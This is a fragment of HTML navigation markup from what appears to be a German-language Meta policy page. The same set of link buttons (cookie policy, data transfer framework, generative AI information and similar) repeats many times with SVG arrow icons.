                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Informationen für diejenigen, die Meta Products nicht verwenden</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Wie Meta Informationen für generative KI-Modelle nutzt</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Rahmenrichtlinie für den Datentransfer</font></font></font></font></font></font></div>
                      <div class="action-button-arrow">
                      </div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Andere Bedingungen</font></font></font></font></font></font></div>
                      <div class="action-button-arrow"><svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" aria-hidden="true" class=""><path d="M6 19h12a1 1 0 0 0 1-1v-5h2v5a3 3 0 0 1-3 3H6a3 3 0 0 1-3-3V6a3 3 0 0 1 3-3h5v2H6a1 1 0 0 0-1 1v12a1 1 0 0 0 1 1z"></path><path d="M11.293 11.293 17.585 5H14a1 1 0 1 1 0-2h6a1 1 0 0 1 1 1v6a1 1 0 1 1-2 0V6.414l-6.293 6.293a1 1 0 0 1-1.414-1.414z"></path></svg></div>
                    </div><div class="action-button">
                    <div class="action-button-img">
                          <svg></svg>
                      </div>
                      <div class="action-button-text"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Cookie-Richtlinie</font></font></font></font></font></font></div>
